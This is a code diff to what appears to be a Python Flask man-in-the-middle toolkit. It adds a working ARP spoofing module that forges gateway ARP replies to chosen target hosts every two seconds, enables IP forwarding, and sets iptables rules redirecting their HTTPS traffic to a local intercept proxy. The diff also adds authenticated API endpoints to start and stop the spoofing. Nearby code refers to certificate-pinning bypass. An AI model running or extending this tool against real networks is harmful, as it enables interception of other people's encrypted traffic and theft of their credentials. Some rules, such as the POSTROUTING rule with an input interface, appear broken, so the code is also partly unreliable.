@@ -1297,6 +1297,245 @@ class HTTPSInterceptProxy:
         return self.traffic_log[-limit:]
 
 
+class ARPSpoofingFallback:
+    """Fallback MITM via ARP spoofing when transparent proxy unavailable.
+
+    When transparent interception fails, fall back to ARP spoofing:
+    1. Declare ourselves as the gateway using ARP replies
+    2. Configure Linux routing to forward intercepted traffic
+    3. Use iptables to redirect HTTPS traffic to local proxy port
+    4. Gracefully handle cleanup on disable
+    """
+
+    def __init__(self):
+        self.active = False
+        self.spoofed_gateway_ip = None
+        self.real_gateway_mac = None
+        self.our_mac = None
+        self.iface = None
+        self.targets = []
+        self.spoof_thread = None
+
+    def detect_transparent_proxy_available(self, iface: str) -> bool:
+        """Check if transparent proxy mode is available on this interface.
+
+        Returns True if iptables REDIRECT target is available.
+        """
+        try:
+            # Test if we can query iptables (requires root)
+            result = subprocess.run(
+                ['iptables', '-L', '-n', '-t', 'nat'],
+                capture_output=True, timeout=2, text=True
+            )
+            return result.returncode == 0
+        except (FileNotFoundError, subprocess.TimeoutExpired):
+            return False
+
+    def enable_arp_spoofing(self, iface: str, gateway_ip: str, targets: list, our_ip: str):
+        """Enable ARP spoofing fallback on specified interface.
+
+        Args:
+            iface: Network interface (e.g., 'wlan0')
+            gateway_ip: Real gateway IP to spoof
+            targets: List of target IP addresses to intercept
+            our_ip: Our IP address on this interface
+        """
+        if self.active:
+            add_log('warn', 'ARP spoofing already active')
+            return False
+
+        try:
+            # Get our MAC address
+            result = subprocess.run(
+                ['ip', 'link', 'show', iface],
+                capture_output=True, text=True, timeout=5
+            )
+            match = re.search(r'link/ether ([0-9a-f:]+)', result.stdout)
+            if not match:
+                add_log('error', f'Could not determine MAC address for {iface}')
+                return False
+            self.our_mac = match.group(1)
+
+            # Get real gateway MAC via ARP
+            result = subprocess.run(
+                ['arp', '-n', gateway_ip],
+                capture_output=True, text=True, timeout=5
+            )
+            match = re.search(r'([0-9a-f:]+) at', result.stdout)
+            if not match:
+                add_log('warn', f'Could not resolve gateway MAC for {gateway_ip}')
+                self.real_gateway_mac = None
+            else:
+                self.real_gateway_mac = match.group(1)
+
+            # Enable IP forwarding
+            self._enable_ip_forwarding()
+
+            # Configure iptables for traffic redirection
+            self._configure_iptables(iface, targets)
+
+            self.active = True
+            self.iface = iface
+            self.spoofed_gateway_ip = gateway_ip
+            self.targets = targets
+
+            # Start ARP spoofing thread
+            self.spoof_thread = threading.Thread(
+                target=self._spoof_arp_loop,
+                args=(iface, gateway_ip, targets, our_ip),
+                daemon=True
+            )
+            self.spoof_thread.start()
+
+            add_log('success', f'ARP spoofing fallback enabled on {iface}')
+            return True
+
+        except Exception as e:
+            add_log('error', f'Failed to enable ARP spoofing: {e}')
+            return False
+
+    def _enable_ip_forwarding(self):
+        """Enable IP forwarding in kernel."""
+        try:
+            subprocess.run(
+                ['sysctl', '-w', 'net.ipv4.ip_forward=1'],
+                capture_output=True, timeout=5, check=True
+            )
+            add_log('info', 'IP forwarding enabled')
+        except (FileNotFoundError, subprocess.CalledProcessError):
+            add_log('warn', 'Failed to enable IP forwarding (sysctl unavailable)')
+
+    def _configure_iptables(self, iface: str, targets: list):
+        """Configure iptables to redirect HTTPS traffic to proxy."""
+        try:
+            # Create custom chain for traffic interception
+            subprocess.run(
+                ['iptables', '-t', 'nat', '-N', 'GODHAND_HTTPS'],
+                capture_output=True, timeout=5
+            )  # Ignore error if chain exists
+
+            # Redirect HTTPS traffic from targets to proxy port
+            for target_ip in targets:
+                subprocess.run(
+                    ['iptables', '-t', 'nat', '-A', 'GODHAND_HTTPS',
+                     '-p', 'tcp', '-d', target_ip, '--dport', '443',
+                     '-j', 'REDIRECT', '--to-port', '8888'],
+                    capture_output=True, timeout=5, check=True
+                )
+
+            # Forward chain to apply redirection
+            subprocess.run(
+                ['iptables', '-t', 'nat', '-A', 'POSTROUTING',
+                 '-i', iface, '-j', 'GODHAND_HTTPS'],
+                capture_output=True, timeout=5, check=True
+            )
+
+            add_log('success', f'iptables redirection configured for {len(targets)} targets')
+
+        except (FileNotFoundError, subprocess.CalledProcessError) as e:
+            add_log('warn', f'iptables configuration failed: {e}')
+
+    def _spoof_arp_loop(self, iface: str, gateway_ip: str, targets: list, our_ip: str):
+        """Continuously send ARP replies claiming to be the gateway.
+
+        This makes target devices think we are the gateway, routing traffic through us.
+        """
+        try:
+            # Build ARP reply packet: we claim to own the gateway IP
+            src_mac = self.our_mac.replace(':', '')
+            src_mac_bytes = bytes.fromhex(src_mac)
+
+            while self.active:
+                for target_ip in targets:
+                    try:
+                        # ARP reply: we are gateway_ip
+                        packet = self._build_arp_reply(src_mac_bytes, gateway_ip, target_ip)
+                        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
+                        sock.bind((iface, 0))
+                        sock.send(packet)
+                        sock.close()
+                    except Exception as e:
+                        add_log('warn', f'ARP spoof to {target_ip} failed: {e}')
+
+                time.sleep(2)  # Re-spoof every 2 seconds to maintain cache
+
+        except Exception as e:
+            add_log('error', f'ARP spoofing loop failed: {e}')
+
+    def _build_arp_reply(self, src_mac: bytes, gateway_ip: str, target_ip: str) -> bytes:
+        """Build raw ARP reply packet."""
+        # Ethernet header
+        dst_mac = bytes.fromhex('ffffffffffff')  # Broadcast
+        frame_type = struct.pack('!H', 0x0806)  # ARP
+
+        # ARP packet
+        hw_type = struct.pack('!H', 1)  # Ethernet
+        proto_type = struct.pack('!H', 0x0800)  # IPv4
+        hw_len = struct.pack('!B', 6)  # MAC length
+        proto_len = struct.pack('!B', 4)  # IP length
+        operation = struct.pack('!H', 2)  # Reply
+
+        # Convert IPs to bytes
+        gw_bytes = socket.inet_aton(gateway_ip)
+        target_bytes = socket.inet_aton(target_ip)
+
+        arp_packet = (hw_type + proto_type + hw_len + proto_len + operation +
+                      src_mac + gw_bytes + dst_mac + target_bytes)
+
+        return dst_mac + src_mac + frame_type + arp_packet
+
+    def disable_arp_spoofing(self):
+        """Disable ARP spoofing and clean up iptables rules."""
+        if not self.active:
+            return
+
+        self.active = False
+
+        try:
+            # Flush GODHAND_HTTPS chain
+            subprocess.run(
+                ['iptables', '-t', 'nat', '-F', 'GODHAND_HTTPS'],
+                capture_output=True, timeout=5
+            )
+
+            # Delete GODHAND_HTTPS chain
+            subprocess.run(
+                ['iptables', '-t', 'nat', '-X', 'GODHAND_HTTPS'],
+                capture_output=True, timeout=5
+            )
+
+            # Remove POSTROUTING rule
+            subprocess.run(
+                ['iptables', '-t', 'nat', '-D', 'POSTROUTING',
+                 '-i', self.iface, '-j', 'GODHAND_HTTPS'],
+                capture_output=True, timeout=5
+            )
+
+            # Disable IP forwarding (if no other services need it)
+            subprocess.run(
+                ['sysctl', '-w', 'net.ipv4.ip_forward=0'],
+                capture_output=True, timeout=5
+            )
+
+            add_log('success', 'ARP spoofing fallback disabled and cleaned up')
+
+        except Exception as e:
+            add_log('warn', f'Cleanup failed: {e}')
+
+    def get_status(self) -> dict:
+        """Get current ARP spoofing fallback status."""
+        return {
+            'active': self.active,
+            'interface': self.iface,
+            'gateway_ip': self.spoofed_gateway_ip,
+            'gateway_mac': self.real_gateway_mac,
+            'our_mac': self.our_mac,
+            'targets_count': len(self.targets) if self.targets else 0
+        }
+
+
+ARP_FALLBACK = ARPSpoofingFallback()
+
 # Initialize MITM proxy on startup
 try:
     HTTPS_PROXY = HTTPSInterceptProxy(listen_port=8888, ca=CERT_AUTHORITY, cert_cache=CERT_CACHE)
@@ -7717,6 +7956,94 @@ def api_https_pinning_toggle():
     add_log('info', f'Pinning bypass for {hostname} {status}')
 
     return jsonify({'success': True, 'message': f'Bypass {status} for {hostname}'})
+
+# ---------- Phase 2B: Transparent Intercept Fallback via ARP Spoofing ----------
+@app.route('/api/arp_fallback/check', methods=['GET'])
+@require_auth
+def api_arp_fallback_check():
+    """Check if transparent proxy is available on current interface."""
+    iface = get_state('interface')
+    if not iface:
+        return jsonify({'success': False, 'error': 'No interface selected'}), 400
+
+    transparent_available = ARP_FALLBACK.detect_transparent_proxy_available(iface)
+    return jsonify({
+        'success': True,
+        'interface': iface,
+        'transparent_available': transparent_available,
+        'arp_fallback_available': not transparent_available,
+        'recommendation': 'use_transparent' if transparent_available else 'enable_arp_fallback'
+    })
+
+@app.route('/api/arp_fallback/enable', methods=['POST'])
+@require_auth
+def api_arp_fallback_enable():
+    """Enable ARP spoofing fallback for transparent interception."""
+    data = request.get_json() or {}
+    gateway_ip = data.get('gateway')
+    targets = data.get('targets', [])
+
+    iface = get_state('interface')
+    if not iface:
+        return jsonify({'success': False, 'error': 'No interface selected'}), 400
+
+    if not gateway_ip:
+        return jsonify({'success': False, 'error': 'gateway_ip required'}), 400
+
+    if not targets:
+        return jsonify({'success': False, 'error': 'targets list required'}), 400
+
+    # Validate IPs
+    try:
+        socket.inet_aton(gateway_ip)
+        for target in targets:
+            socket.inet_aton(target)
+    except socket.error:
+        return jsonify({'success': False, 'error': 'Invalid IP address'}), 400
+
+    # Get our IP on this interface
+    try:
+        result = subprocess.run(
+            ['ip', '-o', '-4', 'addr', 'show', iface],
+            capture_output=True, text=True, timeout=5
+        )
+        match = re.search(r'inet\s+(\S+)', result.stdout)
+        if not match:
+            return jsonify({'success': False, 'error': f'No IP address on {iface}'}), 400
+        our_ip = match.group(1).split('/')[0]
+    except Exception as e:
+        return jsonify({'success': False, 'error': f'Failed to get interface IP: {e}'}), 500
+
+    if ARP_FALLBACK.enable_arp_spoofing(iface, gateway_ip, targets, our_ip):
+        return jsonify({
+            'success': True,
+            'message': f'ARP spoofing enabled on {iface}',
+            'gateway': gateway_ip,
+            'targets': len(targets),
+            'status': ARP_FALLBACK.get_status()
+        })
+    else:
+        return jsonify({'success': False, 'error': 'Failed to enable ARP spoofing'}), 500
+
+@app.route('/api/arp_fallback/disable', methods=['POST'])
+@require_auth
+def api_arp_fallback_disable():
+    """Disable ARP spoofing fallback."""
+    ARP_FALLBACK.disable_arp_spoofing()
+    return jsonify({
+        'success': True,
+        'message': 'ARP spoofing fallback disabled',
+        'status': ARP_FALLBACK.get_status()
+    })
+
+@app.route('/api/arp_fallback/status', methods=['GET'])
+@require_auth
+def api_arp_fallback_status():
+    """Get current ARP spoofing fallback status."""
+    return jsonify({
+        'success': True,
+        'status': ARP_FALLBACK.get_status()
+    })
 
 # ---------- Phase 1.4: Traffic Inspection Layer REST API ----------
 @app.route('/api/https_traffic/start', methods=['POST'])
